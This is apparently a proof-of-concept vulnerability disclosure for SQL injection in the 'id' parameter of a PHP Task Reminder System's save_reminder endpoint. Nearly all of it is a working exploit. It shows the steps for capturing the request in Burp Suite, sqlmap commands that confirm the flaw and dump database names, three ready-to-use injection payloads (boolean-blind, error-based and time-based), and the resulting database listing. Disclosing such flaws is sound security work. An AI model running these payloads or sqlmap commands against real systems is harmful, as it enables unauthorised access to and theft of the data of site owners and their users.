---
slug: tast-reminder-system-save_reminder
title: Task Reminder System (save_reminder)
---


## Details

### Related Code file: 
`/php-trs/classes/Master.php?f=save_reminder`

## Injection parameter: 
`MULTIPART id`


&nbsp;


## POC

![1](https://github.com/user-attachments/assets/8b4de86e-1ca1-4516-b416-30211df9e88e)

Intercept the request using Burpsuite Proxy.

![2](https://github.com/user-attachments/assets/66dcf0dc-81f0-4673-b643-d4c2ae63f71e)

Save the request to `save_reminder.txt`.

### Verify vulnerability

```
sqlmap -r save_reminder.txt --batch
```

![53](https://github.com/user-attachments/assets/e075bc40-fddf-4e3d-abc7-724915f92521)

```
Parameter: id (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: id=' RLIKE (SELECT (CASE WHEN (6121=6121) THEN '' ELSE 0x28 END))-- mGNI&user_id=1&title=test&description=test&remind_from=2024-02-22&remind_to=2024-03-22&status=1

    Type: error-based
    Title: MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)
    Payload: id=' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176716a71,(SELECT (ELT(2360=2360,1))),0x716a6b7871,0x78))s), 8446744073709551610, 8446744073709551610)))-- UFlI&user_id=1&title=test&description=test&remind_from=2024-02-22&remind_to=2024-03-22&status=1

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=' AND (SELECT 8962 FROM (SELECT(SLEEP(5)))kNal)-- JqyW&user_id=1&title=test&description=test&remind_from=2024-02-22&remind_to=2024-03-22&status=1
```


### Dump databases

```
sqlmap -r save_reminder.txt --batch --dbs
```

![54](https://github.com/user-attachments/assets/98385921-beb0-40cc-ac3e-e85fa2bd70e1)

```
[07:19:46] [INFO] fetching database names
[07:19:47] [INFO] retrieved: 'information_schema'
[07:19:47] [INFO] retrieved: 'trs'
available databases [2]:
[*] information_schema
[*] trs
```
